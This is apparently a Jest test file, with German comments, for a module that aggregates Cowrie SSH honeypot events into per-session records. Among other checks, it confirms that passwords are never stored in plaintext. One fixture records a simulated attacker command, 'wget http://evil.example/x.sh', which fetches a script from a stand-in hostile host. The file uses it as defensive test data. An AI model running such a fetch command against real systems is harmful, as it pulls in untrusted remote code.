'use strict';

// ─────────────────────────────────────────────────────────────────────────
// Slice 2 — honeypot_session (Aggregation je sessionId)
//
// Reines Modul: Cowrie-Events → ein Session-Objekt pro sessionId. Keine DB,
// keine API, keine Migration. Feste Regeln:
//  - Passwörter NIE im Klartext (nur passwordObserved + Zähler).
//  - Usernamen nur wenn im Event vorhanden.
//  - Commands bounded (Anzahl + Länge).
//  - Downloads nur mit real vorhandenen Feldern.
//  - Kein Geo/ASN/Reputation/NAT/TLS erfinden.
//  - relatedFlowSessionId === sessionId (Brücke zu Slice-1-Flows).
// ─────────────────────────────────────────────────────────────────────────

const { aggregateHoneypotSessions } = require('../../src/correlation/honeypotSessionNormalizer');

// Wazuh-gewrapptes Cowrie-Event (Felder unter data.*).
const ev = (eventid, over = {}, session = 's1') => ({
  data: { eventid, session, sensor: 'nexora-honeypot', ...over },
});

const fullSession = [
  ev('cowrie.session.connect', { src_ip: '185.220.101.45', src_port: '49152', dst_ip: '10.99.99.80', dst_port: '2222', protocol: 'ssh', timestamp: '2026-06-24T08:15:30.000Z' }),
  ev('cowrie.client.version',  { version: 'SSH-2.0-libssh', hassh: '0e7c3f8a9b', timestamp: '2026-06-24T08:15:30.200Z' }),
  ev('cowrie.login.failed',    { username: 'root', password: 'SECRETpw-aaa', timestamp: '2026-06-24T08:15:31.000Z' }),
  ev('cowrie.login.success',   { username: 'root', password: 'SECRETpw-bbb', timestamp: '2026-06-24T08:15:33.000Z' }),
  ev('cowrie.command.input',   { input: 'uname -a', timestamp: '2026-06-24T08:15:40.000Z' }),
  ev('cowrie.command.input',   { input: 'wget http://evil.example/x.sh', timestamp: '2026-06-24T08:15:45.000Z' }),
  ev('cowrie.session.file_download', { url: 'http://evil.example/x.sh', outfile: 'var/dl/abc123', shasum: 'deadbeefcafe', timestamp: '2026-06-24T08:15:46.000Z' }),
  ev('cowrie.session.closed',  { duration: '270.5', timestamp: '2026-06-24T08:20:00.000Z' }),
];

describe('aggregateHoneypotSessions — vollständige Session', () => {
  const [s] = aggregateHoneypotSessions(fullSession);

  test('Identität + 5-Tuple + Service/Sensor/Zeitfenster', () => {
    expect(s.sessionId).toBe('s1');
    expect(s.sensor).toBe('nexora-honeypot');
    expect(s.service).toBe('ssh');
    expect(s.sourceIp).toBe('185.220.101.45');
    expect(s.sourcePort).toBe(49152);
    expect(s.destinationIp).toBe('10.99.99.80');
    expect(s.destinationPort).toBe(2222);
    expect(s.firstSeen).toBe('2026-06-24T08:15:30.000Z');
    expect(s.lastSeen).toBe('2026-06-24T08:20:00.000Z');
    expect(s.durationMs).toBe(270500);
  });

  test('Login-Status gezählt; authSuccess true', () => {
    expect(s.loginAttempts).toBe(2);
    expect(s.loginFailed).toBe(1);
    expect(s.loginSucceeded).toBe(1);
    expect(s.authSuccess).toBe(true);
    expect(s.usernames).toEqual(['root']);
  });

  test('Passwörter NIE im Klartext — nur passwordObserved + Zähler', () => {
    expect(s.passwordObserved).toBe(true);
    expect(s.passwordAttempts).toBe(2);
    expect(s.password).toBeUndefined();
    expect(s.passwords).toBeUndefined();
    // Hartes Negativ: kein Klartext-Passwort irgendwo im Objekt.
    const blob = JSON.stringify(s);
    expect(blob).not.toContain('SECRETpw-aaa');
    expect(blob).not.toContain('SECRETpw-bbb');
  });

  test('Commands als Liste mit Timestamp', () => {
    expect(s.commandCount).toBe(2);
    expect(s.commandsTruncated).toBe(false);
    expect(s.commands).toHaveLength(2);
    expect(s.commands[0]).toMatchObject({ command: 'uname -a', timestamp: '2026-06-24T08:15:40.000Z' });
    expect(s.commands[1].command).toBe('wget http://evil.example/x.sh');
  });

  test('Downloads nur mit real vorhandenen Feldern', () => {
    expect(s.downloads).toHaveLength(1);
    expect(s.downloads[0]).toMatchObject({ url: 'http://evil.example/x.sh', filename: 'var/dl/abc123', hash: 'deadbeefcafe' });
  });

  test('Fingerprint (hassh/version) nur wenn vorhanden', () => {
    expect(s.fingerprint.hassh).toBe('0e7c3f8a9b');
    expect(s.fingerprint.version).toBe('SSH-2.0-libssh');
  });

  test('Brücke zu Slice-1-Flows + kein erfundener Kontext', () => {
    expect(s.relatedFlowSessionId).toBe('s1');
    for (const k of ['country', 'asn', 'reputation', 'natType', 'postNatDestinationIp', 'ja3', 'tlsSni']) {
      expect(s[k]).toBeUndefined();
    }
  });
});

describe('aggregateHoneypotSessions — Bounding', () => {
  const many = [
    ev('cowrie.command.input', { input: 'aaaaaaaaaa', timestamp: '2026-06-24T08:00:01.000Z' }),
    ev('cowrie.command.input', { input: 'bbbbbbbbbb', timestamp: '2026-06-24T08:00:02.000Z' }),
    ev('cowrie.command.input', { input: 'cccccccccc', timestamp: '2026-06-24T08:00:03.000Z' }),
  ];

  test('maxCommands kappt Liste, commandCount bleibt vollständig, Flag gesetzt', () => {
    const [s] = aggregateHoneypotSessions(many, { maxCommands: 2 });
    expect(s.commands).toHaveLength(2);
    expect(s.commandCount).toBe(3);
    expect(s.commandsTruncated).toBe(true);
  });

  test('maxCommandLen kürzt langen Command + markiert truncated', () => {
    const [s] = aggregateHoneypotSessions(many, { maxCommandLen: 5 });
    expect(s.commands[0].command).toBe('aaaaa');
    expect(s.commands[0].truncated).toBe(true);
  });
});

describe('aggregateHoneypotSessions — mehrere Sessions + authSuccess-Varianten', () => {
  test('je sessionId ein Objekt, sortiert nach firstSeen', () => {
    const events = [
      ev('cowrie.session.connect', { src_ip: '2.2.2.2', timestamp: '2026-06-24T09:00:00.000Z' }, 's2'),
      ev('cowrie.session.connect', { src_ip: '1.1.1.1', timestamp: '2026-06-24T08:00:00.000Z' }, 's1'),
    ];
    const out = aggregateHoneypotSessions(events);
    expect(out.map((s) => s.sessionId)).toEqual(['s1', 's2']);
  });

  test('authSuccess null ohne Login-Events; false bei nur Fehlversuchen', () => {
    const noLogin = aggregateHoneypotSessions([ev('cowrie.command.input', { input: 'id', timestamp: '2026-06-24T08:00:00.000Z' })]);
    expect(noLogin[0].authSuccess).toBeNull();
    expect(noLogin[0].loginAttempts).toBe(0);

    const onlyFailed = aggregateHoneypotSessions([
      ev('cowrie.login.failed', { username: 'admin', password: 'x', timestamp: '2026-06-24T08:00:00.000Z' }),
      ev('cowrie.login.failed', { username: 'admin', password: 'y', timestamp: '2026-06-24T08:00:01.000Z' }),
    ]);
    expect(onlyFailed[0].authSuccess).toBe(false);
    expect(onlyFailed[0].loginFailed).toBe(2);
  });
});

describe('aggregateHoneypotSessions — Robustheit', () => {
  test('out-of-order Events: firstSeen/lastSeen korrekt', () => {
    const out = aggregateHoneypotSessions([
      ev('cowrie.session.closed',  { duration: '5', timestamp: '2026-06-24T08:00:10.000Z' }),
      ev('cowrie.session.connect', { src_ip: '1.1.1.1', timestamp: '2026-06-24T08:00:00.000Z' }),
    ]);
    expect(out[0].firstSeen).toBe('2026-06-24T08:00:00.000Z');
    expect(out[0].lastSeen).toBe('2026-06-24T08:00:10.000Z');
  });

  test('Nicht-Cowrie-Events + Events ohne session werden ignoriert', () => {
    const out = aggregateHoneypotSessions([
      { data: { srcip: '10.0.0.1', dstip: '8.8.8.8' } },                 // Firewall, kein cowrie
      { data: { win: { system: { eventID: '3' } } } },                   // Sysmon, kein cowrie
      ev('cowrie.command.input', { input: 'id', session: '' }),          // cowrie ohne session
      ev('cowrie.session.connect', { src_ip: '1.1.1.1', timestamp: '2026-06-24T08:00:00.000Z' }),
    ]);
    expect(out).toHaveLength(1);
    expect(out[0].sessionId).toBe('s1');
  });

  test('Download ohne Felder erzeugt keinen leeren Eintrag', () => {
    const out = aggregateHoneypotSessions([
      ev('cowrie.session.connect', { src_ip: '1.1.1.1', timestamp: '2026-06-24T08:00:00.000Z' }),
    ]);
    expect(out[0].downloads).toEqual([]);
  });
});
